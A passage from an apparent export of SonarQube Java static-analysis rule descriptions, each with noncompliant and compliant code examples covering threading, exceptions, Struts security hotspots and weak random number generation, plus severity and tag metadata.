avoided.</p>
<h2>Compliant Solution</h2>
<pre>
ThreadFactory threadFactory = Executors.defaultThreadFactory();
ThreadPoolExecutor executorPool = new ThreadPoolExecutor(3, 10, 5, TimeUnit.SECONDS, new ArrayBlockingQueue&lt;Runnable&gt;(2), threadFactory);

for (int i = 0; i &lt; 10; i++) {
  executorPool.execute(new JobThread(""Job: "" + i));
}

System.out.println(executorPool.getActiveCount()); // Compliant
executorPool.shutdown();
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/RQCHAQ"">CERT, THI01-J.</a> - Do not invoke ThreadGroup methods </li>
</ul>","""ThreadGroup"" should not be used",[],BLOCKER,"['cert', 'design', 'suspicious']",CODE_SMELL
2013-08-30T17:20:57+0200,"<p>An exception in a <code>throws</code> declaration in Java is superfluous if it is:</p>
<ul>
  <li> listed multiple times </li>
  <li> a subclass of another listed exception </li>
  <li> a <code>RuntimeException</code>, or one of its descendants </li>
  <li> completely unnecessary because the declared exception type cannot actually be thrown </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
void foo() throws MyException, MyException {}  // Noncompliant; should be listed once
void bar() throws Throwable, Exception {}  // Noncompliant; Exception is a subclass of Throwable
void baz() throws RuntimeException {}  // Noncompliant; RuntimeException can always be thrown
</pre>
<h2>Compliant Solution</h2>
<pre>
void foo() throws MyException {}
void bar() throws Throwable {}
void baz() {}
</pre>
<h2>Exceptions</h2>
<p>The rule will not raise any issue for exceptions that cannot be thrown from the method body:</p>
<ul>
  <li> in overriding and implementation methods </li>
  <li> in interface <code>default</code> methods </li>
  <li> in non-private methods that only <code>throw</code>, have empty bodies, or a single return statement . </li>
  <li> in overridable methods (non-final, or not member of a final class, non-static, non-private), if the exception is documented with a proper
  javadoc. </li>
</ul>
<pre>
class A extends B {
  @Override
  void doSomething() throws IOException {
    compute(a);
  }

  public void foo() throws IOException {}

  protected void bar() throws IOException {
    throw new UnsupportedOperationException(""This method should be implemented in subclasses"");
  }

  Object foobar(String s) throws IOException {
    return null;
  }

  /**
   * @throws IOException Overriding classes may throw this exception if they print values into a file
   */
  protected void print() throws IOException { // no issue, method is overridable and the exception has proper javadoc
    System.out.println(""foo"");
  }
}
</pre>",squid:RedundantThrowsDeclarationCheck,java,Java,"<p>An exception in a <code>throws</code> declaration in Java is superfluous if it is:</p>
<ul>
  <li> listed multiple times </li>
  <li> a subclass of another listed exception </li>
  <li> a <code>RuntimeException</code>, or one of its descendants </li>
  <li> completely unnecessary because the declared exception type cannot actually be thrown </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
void foo() throws MyException, MyException {}  // Noncompliant; should be listed once
void bar() throws Throwable, Exception {}  // Noncompliant; Exception is a subclass of Throwable
void baz() throws RuntimeException {}  // Noncompliant; RuntimeException can always be thrown
</pre>
<h2>Compliant Solution</h2>
<pre>
void foo() throws MyException {}
void bar() throws Throwable {}
void baz() {}
</pre>
<h2>Exceptions</h2>
<p>The rule will not raise any issue for exceptions that cannot be thrown from the method body:</p>
<ul>
  <li> in overriding and implementation methods </li>
  <li> in interface <code>default</code> methods </li>
  <li> in non-private methods that only <code>throw</code>, have empty bodies, or a single return statement . </li>
  <li> in overridable methods (non-final, or not member of a final class, non-static, non-private), if the exception is documented with a proper
  javadoc. </li>
</ul>
<pre>
class A extends B {
  @Override
  void doSomething() throws IOException {
    compute(a);
  }

  public void foo() throws IOException {}

  protected void bar() throws IOException {
    throw new UnsupportedOperationException(""This method should be implemented in subclasses"");
  }

  Object foobar(String s) throws IOException {
    return null;
  }

  /**
   * @throws IOException Overriding classes may throw this exception if they print values into a file
   */
  protected void print() throws IOException { // no issue, method is overridable and the exception has proper javadoc
    System.out.println(""foo"");
  }
}
</pre>","""throws"" declarations should not be superfluous",[],MINOR,"['clumsy', 'error-handling', 'redundant', 'unused']",CODE_SMELL
2018-11-12T11:11:26+0100,"<p>Marking an array <code>volatile</code> means that the array itself will always be read fresh and never thread cached, but the items <em>in</em> the
array will not be. Similarly, marking a mutable object field <code>volatile</code> means the object <em>reference</em> is <code>volatile</code> but
the object itself is not, and other threads may not see updates to the object state.</p>
<p>This can be salvaged with arrays by using the relevant AtomicArray class, such as <code>AtomicIntegerArray</code>, instead. For mutable objects,
the <code>volatile</code> should be removed, and some other method should be used to ensure thread-safety, such as synchronization, or ThreadLocal
storage.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private volatile int [] vInts;  // Noncompliant
private volatile MyObj myObj;  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
private AtomicIntegerArray vInts;
private MyObj myObj;
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/twD1AQ"">CERT, CON50-J.</a> - Do not assume that declaring a reference volatile
  guarantees safe publication of the members of the referenced object </li>
</ul>",squid:S3077,java,Java,"<p>Marking an array <code>volatile</code> means that the array itself will always be read fresh and never thread cached, but the items <em>in</em> the
array will not be. Similarly, marking a mutable object field <code>volatile</code> means the object <em>reference</em> is <code>volatile</code> but
the object itself is not, and other threads may not see updates to the object state.</p>
<p>This can be salvaged with arrays by using the relevant AtomicArray class, such as <code>AtomicIntegerArray</code>, instead. For mutable objects,
the <code>volatile</code> should be removed, and some other method should be used to ensure thread-safety, such as synchronization, or ThreadLocal
storage.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private volatile int [] vInts;  // Noncompliant
private volatile MyObj myObj;  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
private AtomicIntegerArray vInts;
private MyObj myObj;
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/twD1AQ"">CERT, CON50-J.</a> - Do not assume that declaring a reference volatile
  guarantees safe publication of the members of the referenced object </li>
</ul>","Non-primitive fields should not be ""volatile""",[],MINOR,"['cert', 'multi-threading']",BUG
2018-11-12T11:11:26+0100,"<p>Using compound operators as well as increments and decrements (and toggling, in the case of <code>boolean</code>s) on primitive fields are not
atomic operations. That is, they don't happen in a single step. For instance, when a <code>volatile</code> primitive field is incremented or
decremented you run the risk of data loss if threads interleave in the steps of the update. Instead, use a guaranteed-atomic class such as
<code>AtomicInteger</code>, or synchronize the access.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private volatile int count = 0;
private volatile boolean boo = false;

public void incrementCount() {
  count++;  // Noncompliant
}

public void toggleBoo(){
  boo = !boo;  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private AtomicInteger count = 0;
private boolean boo = false;

public void incrementCount() {
  count.incrementAndGet();
}

public synchronized void toggleBoo() {
  boo = !boo;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/RIFJAg"">CERT, VNA02-J.</a> - Ensure that compound operations on shared variables are
  atomic </li>
</ul>",squid:S3078,java,Java,"<p>Using compound operators as well as increments and decrements (and toggling, in the case of <code>boolean</code>s) on primitive fields are not
atomic operations. That is, they don't happen in a single step. For instance, when a <code>volatile</code> primitive field is incremented or
decremented you run the risk of data loss if threads interleave in the steps of the update. Instead, use a guaranteed-atomic class such as
<code>AtomicInteger</code>, or synchronize the access.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private volatile int count = 0;
private volatile boolean boo = false;

public void incrementCount() {
  count++;  // Noncompliant
}

public void toggleBoo(){
  boo = !boo;  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private AtomicInteger count = 0;
private boolean boo = false;

public void incrementCount() {
  count.incrementAndGet();
}

public synchronized void toggleBoo() {
  boo = !boo;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/RIFJAg"">CERT, VNA02-J.</a> - Ensure that compound operations on shared variables are
  atomic </li>
</ul>","""volatile"" variables should not be used with compound operators",[],MAJOR,"['cert', 'multi-threading']",BUG
2018-11-12T11:11:26+0100,"<p>When using <code>Math.min()</code> and <code>Math.max()</code> together for bounds checking, it's important to feed the right operands to each
method. <code>Math.min()</code> should be used with the <strong>upper</strong> end of the range being checked, and <code>Math.max()</code> should be
used with the <strong>lower</strong> end of the range. Get it backwards, and the result will always be the same end of the range.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  private static final int UPPER = 20;
  private static final int LOWER = 0;

  public int doRangeCheck(int num) {    // Let's say num = 12
    int result = Math.min(LOWER, num);  // result = 0
    return Math.max(UPPER, result);     // Noncompliant; result is now 20: even though 12 was in the range
  }
</pre>
<h2>Compliant Solution</h2>
<p>Swapping method <code>min()</code> and <code>max()</code> invocations without changing parameters.</p>
<pre>
  private static final int UPPER = 20;
  private static final int LOWER = 0;

  public int doRangeCheck(int num) {    // Let's say num = 12
    int result = Math.max(LOWER, num);  // result = 12
    return Math.min(UPPER, result);     // Compliant; result is still 12
  }
</pre>
<p>or swapping bounds <code>UPPER</code> and <code>LOWER</code> used as parameters without changing the invoked methods.</p>
<pre>
  private static final int UPPER = 20;
  private static final int LOWER = 0;

  public int doRangeCheck(int num) {    // Let's say num = 12
    int result = Math.min(UPPER, num);  // result = 12
    return Math.max(LOWER, result);     // Compliant; result is still 12
  }
</pre>",squid:S3065,java,Java,"<p>When using <code>Math.min()</code> and <code>Math.max()</code> together for bounds checking, it's important to feed the right operands to each
method. <code>Math.min()</code> should be used with the <strong>upper</strong> end of the range being checked, and <code>Math.max()</code> should be
used with the <strong>lower</strong> end of the range. Get it backwards, and the result will always be the same end of the range.</p>
<h2>Noncompliant Code Example</h2>
<pre>
  private static final int UPPER = 20;
  private static final int LOWER = 0;

  public int doRangeCheck(int num) {    // Let's say num = 12
    int result = Math.min(LOWER, num);  // result = 0
    return Math.max(UPPER, result);     // Noncompliant; result is now 20: even though 12 was in the range
  }
</pre>
<h2>Compliant Solution</h2>
<p>Swapping method <code>min()</code> and <code>max()</code> invocations without changing parameters.</p>
<pre>
  private static final int UPPER = 20;
  private static final int LOWER = 0;

  public int doRangeCheck(int num) {    // Let's say num = 12
    int result = Math.max(LOWER, num);  // result = 12
    return Math.min(UPPER, result);     // Compliant; result is still 12
  }
</pre>
<p>or swapping bounds <code>UPPER</code> and <code>LOWER</code> used as parameters without changing the invoked methods.</p>
<pre>
  private static final int UPPER = 20;
  private static final int LOWER = 0;

  public int doRangeCheck(int num) {    // Let's say num = 12
    int result = Math.min(UPPER, num);  // result = 12
    return Math.max(LOWER, result);     // Compliant; result is still 12
  }
</pre>",Min and max used in combination should not always return the same value,[],MAJOR,[],BUG
2018-09-06T11:04:31+0200,"<p>Using Struts 1 ActionForm is security-sensitive. For example, their use has led in the past to the following vulnerability:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0114"">CVE-2014-0114</a> </li>
</ul>
<p>All classes extending <code>org.apache.struts.action.Action</code> are potentially remotely reachable. The <code>ActionForm</code> object provided
as a parameter of the <code>execute</code> method is automatically instantiated and populated with the HTTP parameters. One should review the use of
these parameters to be sure they are used safely. </p>
<p>This rule is there to allow a security auditor to quickly find some potential hotspots to review.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> some parameters of the ActionForm might not have been validated properly. </li>
  <li> dangerous parameter names are accepted. Example: accept a ""class"" parameter and use the form to populate JavaBean properties (see the
  CVE-2014-0114 above). </li>
  <li> there are unused fields which are not empty or undefined. </li>
</ul>
<p>You are at risk if you answered to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>All ActionForm's properties should be validated, including their size. Whenever possible, filter the parameters with a whitelist of valid values.
Otherwise, escape any sensitive character and constrain the values as much as possible.</p>
<p>Allow only non security-sensitive property names. All the ActionForm's property names should be whitelisted.</p>
<p>Unused fields should be constrained so that they are either empty or undefined.</p>
<h1>Noncompliant Code Example</h1>
<pre>
// Struts 1.1+
public final class CashTransferAction extends Action {

  public String fromAccount = """";
  public String toAccount = """";

  public ActionForward execute(ActionMapping mapping, ActionForm form, HttpServletRequest req, HttpServletResponse res) throws Exception {
    // usage of the ""form"" object to call some services doing JDBC actions
    [...]
    return mapping.findForward(resultat);
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/105.html"">MITRE, CWE-105</a>: Struts Form Field Without Validator </li>
</ul>",squid:S4530,java,Java,"<p>Using Struts 1 ActionForm is security-sensitive. For example, their use has led in the past to the following vulnerability:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0114"">CVE-2014-0114</a> </li>
</ul>
<p>All classes extending <code>org.apache.struts.action.Action</code> are potentially remotely reachable. The <code>ActionForm</code> object provided
as a parameter of the <code>execute</code> method is automatically instantiated and populated with the HTTP parameters. One should review the use of
these parameters to be sure they are used safely. </p>
<p>This rule is there to allow a security auditor to quickly find some potential hotspots to review.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> some parameters of the ActionForm might not have been validated properly. </li>
  <li> dangerous parameter names are accepted. Example: accept a ""class"" parameter and use the form to populate JavaBean properties (see the
  CVE-2014-0114 above). </li>
  <li> there are unused fields which are not empty or undefined. </li>
</ul>
<p>You are at risk if you answered to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>All ActionForm's properties should be validated, including their size. Whenever possible, filter the parameters with a whitelist of valid values.
Otherwise, escape any sensitive character and constrain the values as much as possible.</p>
<p>Allow only non security-sensitive property names. All the ActionForm's property names should be whitelisted.</p>
<p>Unused fields should be constrained so that they are either empty or undefined.</p>
<h1>Noncompliant Code Example</h1>
<pre>
// Struts 1.1+
public final class CashTransferAction extends Action {

  public String fromAccount = """";
  public String toAccount = """";

  public ActionForward execute(ActionMapping mapping, ActionForm form, HttpServletRequest req, HttpServletResponse res) throws Exception {
    // usage of the ""form"" object to call some services doing JDBC actions
    [...]
    return mapping.findForward(resultat);
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/105.html"">MITRE, CWE-105</a>: Struts Form Field Without Validator </li>
</ul>",Using Struts 1 ActionForm is security-sensitive,[],MAJOR,"['cwe', 'owasp-a1', 'struts']",SECURITY_HOTSPOT
2018-09-06T11:04:31+0200,"<p>Using setters in Struts 2 ActionSupport is security-sensitive. For example, their use has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1006"">CVE-2012-1006</a> </li>
</ul>
<p>All classes extending <code>com.opensymphony.xwork2.ActionSupport</code> are potentially remotely reachable. An action class extending
ActionSupport will receive all HTTP parameters sent and these parameters will be automatically mapped to the setters of the Struts 2 action class. One
should review the use of the fields set by the setters, to be sure they are used safely. By default, they should be considered as untrusted
inputs.</p>
<p>This rule is there to allow a security auditor to quickly find some potential hotspots to review.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the setter is needed. There is no need for it if the attribute's goal is not to map queries' parameter. </li>
  <li> the value provided to the setter is properly sanitized before being used or stored. (*) </li>
</ul>
<p>(*) You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>As said in Strut's documentation: <a href=""https://struts.apache.org/security/#do-not-define-setters-when-not-needed"">""Do not define setters when
not needed""</a></p>
<p>Sanitize the user input. This can be for example done by implementing the <code>validate()</code> method of
<code>com.opensymphony.xwork2.ActionSupport</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class AccountBalanceAction extends ActionSupport {
  private static final long serialVersionUID = 1L;
  private Integer accountId;

  // this setter might be called with user input
  public void setAccountId(Integer accountId) {
    this.accountId = accountId;
  }

  @Override
  public String execute() throws Exception {
    // call a service to get the account's details and its balance
    [...]
    return SUCCESS;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
</ul>",squid:S4531,java,Java,"<p>Using setters in Struts 2 ActionSupport is security-sensitive. For example, their use has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1006"">CVE-2012-1006</a> </li>
</ul>
<p>All classes extending <code>com.opensymphony.xwork2.ActionSupport</code> are potentially remotely reachable. An action class extending
ActionSupport will receive all HTTP parameters sent and these parameters will be automatically mapped to the setters of the Struts 2 action class. One
should review the use of the fields set by the setters, to be sure they are used safely. By default, they should be considered as untrusted
inputs.</p>
<p>This rule is there to allow a security auditor to quickly find some potential hotspots to review.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the setter is needed. There is no need for it if the attribute's goal is not to map queries' parameter. </li>
  <li> the value provided to the setter is properly sanitized before being used or stored. (*) </li>
</ul>
<p>(*) You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>As said in Strut's documentation: <a href=""https://struts.apache.org/security/#do-not-define-setters-when-not-needed"">""Do not define setters when
not needed""</a></p>
<p>Sanitize the user input. This can be for example done by implementing the <code>validate()</code> method of
<code>com.opensymphony.xwork2.ActionSupport</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class AccountBalanceAction extends ActionSupport {
  private static final long serialVersionUID = 1L;
  private Integer accountId;

  // this setter might be called with user input
  public void setAccountId(Integer accountId) {
    this.accountId = accountId;
  }

  @Override
  public String execute() throws Exception {
    // call a service to get the account's details and its balance
    [...]
    return SUCCESS;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
</ul>",Using setters in Struts 2 ActionSupport is security-sensitive,[],MAJOR,"['owasp-a1', 'struts']",SECURITY_HOTSPOT
2013-06-19T09:21:15+0200,"<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many
things.</p>
<h2>Noncompliant Code Example</h2>
<p>With a maximum number of 4 parameters:</p>
<pre>
public void doSomething(int param1, int param2, int param3, String param4, long param5) {
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(int param1, int param2, int param3, String param4) {
...
}
</pre>
<h2>Exceptions</h2>
<p>Methods annotated with Spring's <code>@RequestMapping</code> (and related shortcut annotations, like <code>@GetRequest</code>) or
<code>@JsonCreator</code> may have a lot of parameters, encapsulation being possible. Such methods are therefore ignored.</p>",squid:S00107,java,Java,"<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many
things.</p>
<h2>Noncompliant Code Example</h2>
<p>With a maximum number of 4 parameters:</p>
<pre>
public void doSomething(int param1, int param2, int param3, String param4, long param5) {
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(int param1, int param2, int param3, String param4) {
...
}
</pre>
<h2>Exceptions</h2>
<p>Methods annotated with Spring's <code>@RequestMapping</code> (and related shortcut annotations, like <code>@GetRequest</code>) or
<code>@JsonCreator</code> may have a lot of parameters, encapsulation being possible. Such methods are therefore ignored.</p>",Methods should not have too many parameters,"[{'key': 'max', 'htmlDesc': 'Maximum authorized number of parameters', 'defaultValue': '7', 'type': 'INTEGER'}, {'key': 'constructorMax', 'htmlDesc': 'Maximum authorized number of parameters for a constructor', 'defaultValue': '7', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2015-01-05T09:08:32+0100,"<p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386"">CVE-2013-6386</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419"">CVE-2006-3419</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102"">CVE-2008-4102</a> </li>
</ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<p>As the <code>java.util.Random</code> class relies on a pseudorandom number generator, this class and relating <code>java.lang.Math.random()</code>
method should not be used for security-critical applications or for protecting sensitive data. In such context, the
<code>java.security.SecureRandom</code> class which relies on a cryptographically strong random number generator (RNG) should be used in place.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li>
  <li> the function you use generates a value which can be predicted (pseudo-random). </li>
  <li> the generated value is used multiple times. </li>
  <li> an attacker can access the generated value. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use a cryptographically strong random number generator (RNG) like ""java.security.SecureRandom"" in place of this PRNG. </li>
  <li> Use the generated random values only once. </li>
  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
Random random = new Random(); // Questionable use of Random
byte bytes[] = new byte[20];
random.nextBytes(bytes); // Check if bytes is used for hashing, encryption, etc...
</pre>
<h2>Compliant Solution</h2>
<pre>
SecureRandom random = new SecureRandom(); // Compliant for security-sensitive use cases
byte bytes[] = new byte[20];
random.nextBytes(bytes);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/338.html"">MITRE, CWE-338</a> - Use of Cryptographically Weak Pseudo-Random Number Generator
  (PRNG) </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/330.html"">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/326.html"">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/310"">MITRE, CWE-310</a> - Cryptographic Issues </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/mAFqAQ"">CERT, MSC02-J.</a> - Generate strong random numbers </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qw4"">CERT, MSC30-C.</a> - Do not use the rand() function for generating pseudorandom
  numbers </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/WYIyAQ"">CERT, MSC50-CPP.</a> - Do not use std::rand() for generating pseudorandom
  numbers </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> Derived from FindSecBugs rule <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM"">Predictable Pseudo Random Number
  Generator</a> </li>
</ul>",squid:S2245,java,Java,"<p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386"">CVE-2013-6386</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419"">CVE-2006-3419</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102"">CVE-2008-4102</a> </li>
</ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<p>As the <code>java.util.Random</code> class relies on a pseudorandom number generator, this class and relating <code>java.lang.Math.random()</code>
method should not be used for security-critical applications or for protecting sensitive data. In such context, the
<code>java.security.SecureRandom</code> class which relies on a cryptographically strong random number generator (RNG) should be used in place.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li>
  <li> the function you use generates a value which can be predicted (pseudo-random). </li>
  <li> the generated value is used multiple times. </li>
  <li> an attacker can access the generated value. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use a cryptographically strong random number generator (RNG) like ""java.security.SecureRandom"" in place of this PRNG. </li>
  <li> Use the generated random values only once. </li>
  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
Random random = new Random(); // Questionable use of Random
byte bytes[] = new byte[20];
random.nextBytes(bytes); // Check if bytes is used for hashing, encryption, etc...
</pre>
<h2>Compliant Solution</h2>
<pre>
SecureRandom random = new SecureRandom(); // Compliant for security-sensitive use cases
byte bytes[] = new byte[20];
random.nextBytes(bytes);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/338.html"">MITRE, CWE-338</a> - Use of Cryptographically Weak Pseudo-Random Number Generator
  (PRNG) </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/330.html"">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/326.html"">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/310"">MITRE, CWE-310</a> - Cryptographic Issues </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/mAFqAQ"">CERT, MSC02-J.</a> - Generate strong random numbers </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/qw4"">CERT, MSC30-C.</a> - Do not use the rand() function for generating pseudorandom
  numbers </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/WYIyAQ"">CERT, MSC50-CPP.</a> - Do not use std::rand() for generating pseudorandom
  numbers </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> Derived from FindSecBugs rule <a href=""http://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM"">Predictable Pseudo Random Number
  Generator</a> </li>
</ul>",Using pseudorandom number generators (PRNGs) is security-sensitive,[],CRITICAL,"['cert', 'cwe', 'owasp-a3']",SECURITY_HOTSPOT
2015-07-08T12:40:14+0200,"<p>Declaring multiple variables on one line is difficult to read.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass {

  private int a, b;

  public void method(){
    int c; int d;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {

  private int a;
  private int b;

  public void method(){
    int c;
    int d;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 8-0-1 - An init-declarator-list or a member-declarator-list shall consist of a single init-declarator or member-declarator
  respectively </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/7wHEAw"">CERT, DCL52-J.</a> - Do not declare more than one variable per declaration
  </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/VgU"">CERT, DCL04-C.</a> - Do not declare more than one variable per declaration </li>
</ul>",squid:S1659,java,Java,"<p>Declaring multiple variables on one line is difficult to read.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass {

  private int a, b;

  public void method(){
    int c; int d;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {

  private int a;
  private int b;

  public void method(){
    int c;
    int d;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 8-0-1 - An init-declarator-list or a member-declarator-list shall consist of a single init-declarator or member-declarator
  respectively </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/7wHEAw"">CERT, DCL52-J.</a> - Do not declare more than one variable per declaration
  </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/VgU"">CERT, DCL04-C.</a> - Do not declare more than one variable per declaration </li>
</ul>",Multiple variables should not be declared on the same line,[],MINOR,"['cert', 'convention', 'misra']",CODE_SMELL
2015-06-04T13:56:30+0200,"<p>When all the keys of a Map are values from the same enum, the <code>Map</code> can be replaced with an <code>EnumMap</code>, which can be much more
efficient than other sets because the underlying data structure is a simple array.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {

  public enum COLOR {
    RED, GREEN, BLUE, ORANGE;
  }

  public void mapMood() {
    Map&lt;COLOR, String&gt; moodMap = new HashMap&lt;COLOR, String&gt; ();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {

  public enum COLOR {
    RED, GREEN, BLUE, ORANGE;
  }

  public void mapMood() {
    EnumMap&lt;COLOR, String&gt; moodMap = new EnumMap&lt;&gt; (COLOR.class);
  }
}
</pre>",squid:S1640,java,Java,"<p>When all the keys of a Map are values from the same enum, the <code>Map</code> can be replaced with an <code>EnumMap</code>, which can be much more
efficient than other sets because the underlying data structure is a simple array.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {

  public enum COLOR {
    RED, GREEN, BLUE, ORANGE;
  }

  public void mapMood() {
    Map&lt;COLOR, String&gt; moodMap = new HashMap&lt;COLOR, String&gt; ();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {

  public enum COLOR {
    RED, GREEN, BLUE, ORANGE;
  }

  public void mapMood() {
    EnumMap&lt;COLOR, String&gt; moodMap = new EnumMap&lt;&gt; (COLOR.class);
  }
}
</pre>",Maps with keys that are enum values should be replaced with EnumMap,[],MINOR,['performance'],CODE_SMELL
2016-08-04T14:31:39+0200,"<p>When the value of a private field is always assigned to in a class' methods before being read, then it is not being used to store class
information. Therefore, it should become a local variable in the relevant methods to prevent any misunderstanding.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo {
  private int a;
  private int b;

  public void doSomething(int y) {
    a = y + 5;
    ...
    if(a == 0) {
      ...
    }
    ...
  }

  public void doSomethingElse(int y) {
    b = y + 3;
    ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo {

  public void doSomething(int y) {
    int a = y + 5;
    ...
    if(a == 0) {
      ...
    }
  }

  public void doSomethingElse(int y) {
    int b = y + 3;
    ...
  }
}
</pre>
<h2>Exceptions</h2>
